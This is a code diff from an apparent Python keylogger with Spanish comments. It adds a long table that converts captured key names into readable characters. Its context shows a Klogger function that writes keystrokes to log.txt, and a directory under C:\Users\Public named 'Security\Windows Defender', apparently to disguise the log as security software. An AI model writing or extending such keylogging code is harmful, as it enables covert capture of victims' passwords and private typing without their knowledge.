@@ -25,6 +25,115 @@ import socket
 import time
 import threading # Hilos
 
+# Convierte tecla a un valor legible
+def KeyConMin(argument):                # Caracteres Comunes // Optimizados
+    switcher = {
+        # Vocales Minisculas
+        "'a'": "a",
+        "'e'": "e",
+        "'i'": "i",
+        "'o'": "o",
+        "'u'": "u",
+        # Letras  Minusculas
+        "'b'": "b",
+        "'c'": "c",
+        "'d'": "d",
+        "'f'": "f",
+        "'g'": "g",
+        "'h'": "h",
+        "'j'": "j",
+        "'J'": "J",
+        "'k'": "k",
+        "'l'": "l",
+        "'m'": "m",
+        "'n'": "n",
+        "'ñ'": "ñ",
+        "'p'": "p",
+        "'q'": "q",
+        "'r'": "r",
+        "'s'": "s",
+        "'t'": "t",
+        "'v'": "v",
+        "'w'": "w",
+        "'x'": "x",
+        "'y'": "y",
+        "'z'": "z",
+        # Caracteres
+        "','": ",",                     # ,
+        "'.'": ".",                     # .
+        "'_'": "_",                     # _
+        "'-'": "-",                     # -
+        "':'": ":",                     #
+        # Vocales Mayúsculas
+        "'A'": "A",
+        "'E'": "E",
+        "'I'": "I",
+        "'O'": "O",
+        "'U'": "U",
+        # Letras Mayúsculas
+        "'B'": "B",
+        "'C'": "C",
+        "'D'": "D",
+        "'F'": "F",
+        "'G'": "G",
+        "'H'": "H",
+        "'K'": "K",
+        "'L'": "L",
+        "'M'": "M",
+        "'N'": "N",
+        "'Ñ'": "Ñ",
+        "'P'": "P",
+        "'Q'": "Q",
+        "'R'": "R",
+        "'S'": "S",
+        "'T'": "T",
+        "'V'": "V",
+        "'W'": "W",
+        "'X'": "X",
+        "'Y'": "Y",
+        "'Z'": "Z",
+        # Números Standard
+        "'1'": "1",
+        "'2'": "2",
+        "'3'": "3",
+        "'4'": "4",
+        "'5'": "5",
+        "'6'": "6",
+        "'7'": "7",
+        "'8'": "8",
+        "'9'": "9",
+        "'0'": "0",
+        # Caracteres Especiales
+        "'@'": "@",                     # @
+        "'#'": "#",                     # #
+        "'*'": "*",                     #
+        "'('": "(",                     # (
+        "')'": ")",                     # )
+        "'?'": "?",                     # ?
+        "'='": "=",                     # =
+        "'+'": "+",                     # +
+        "'!'": "!",                     # !
+        "'}'": "}",                     # }
+        "'{'": "{",                     # {}
+        "'´'": "´",                     # ´
+        "'|'": "|",                     # |
+        "'°'": "°",                     # °
+        "'^'": "¬",                     # ^
+        "';'": ";",                     #
+        "'$'": "$",                     # $
+        "'%'": "%",                     # %
+        "'&'": "&",                     # &
+        "'>'": ">",                     #
+        "'<'": "<",                     # 
+        "'/'": "/",                     # /
+        "'¿'": "¿",                     # ¿
+        "'¡'": "¡",                     # ¡
+        "'~'": "~"                      #
+    }
+    return switcher.get(argument, "")
+
+
+
 # Obtiene registro de teclas y guarda en un archivo log.txt
 def Klogger():
     CreateDir()  # Function: Crea el directorio ==> C:\Users\Public\Security\Windows Defender
